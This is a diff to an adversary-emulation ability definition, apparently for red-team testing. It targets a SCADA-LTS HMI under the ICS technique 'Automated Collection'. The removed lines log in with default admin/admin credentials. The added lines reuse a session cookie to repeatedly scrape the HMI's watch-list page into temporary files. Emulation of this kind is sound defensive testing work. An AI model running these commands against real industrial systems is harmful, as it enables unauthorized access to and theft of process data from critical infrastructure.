@@ -3,7 +3,7 @@
 - id: a7b8c9d0-7777-7777-7777-000000000002
   name: SCADA-LTS - Automated Process Data Theft
   description: |
-    Poll data points for 1 minute (6 cycles) instead of 2 minutes
+    Polls watch_list.shtm (HTML) every 5s — no JSON API assumed. Session /tmp/hmi_cookies.txt.
   tactic: collection
   technique_id: T0802
   technique_name: Automated Collection
@@ -11,14 +11,11 @@
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080" &&
-      curl -s -c /tmp/hmi.jar
-      -d "username=admin&password=admin"
-      "$HMI/login.htm" -o /dev/null &&
       for cycle in 1 2 3 4 5 6; do
         echo "[Cycle $cycle]" &&
-        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null &&
-        echo "" && sleep 5;
+        curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/watch_list.shtm" -o /tmp/hmi_poll_$cycle.html &&
+        wc -c /tmp/hmi_poll_$cycle.html &&
+        sleep 5;
       done &&
       echo "DATA_COLLECTION_COMPLETE"
-    timeout: 60
+    timeout: 90
